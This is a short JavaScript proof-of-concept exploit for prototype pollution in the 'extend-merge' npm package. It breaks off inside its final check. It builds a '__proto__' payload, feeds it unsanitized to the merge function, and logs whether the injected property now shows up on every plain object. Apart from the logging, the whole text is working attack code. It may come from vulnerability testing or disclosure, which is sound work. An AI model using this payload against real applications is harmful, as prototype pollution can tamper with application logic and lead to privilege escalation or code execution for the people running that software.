```js
async function exploit() {
   const merge = require('extend-merge').default || require('extend-merge');

   console.log(`[+] Initial state check: {}.exploited = ${JSON.stringify({}.exploited)}`);

   // Standard prototype pollution attack vector
   // Targets the internal [[Prototype]] chain or constructor path
   const payload = { "__proto__": { "exploited": true } };

   // Execute merge with unsanitized input. 
   // Exceptions will propagate naturally to demonstrate crash paths or rejection.
   merge({}, payload);

   console.log(`[+] Post-merge verification: {}.exploited = ${JSON.stringify({}.exploited)}`);

   if ({}.exploited !== undefined) {
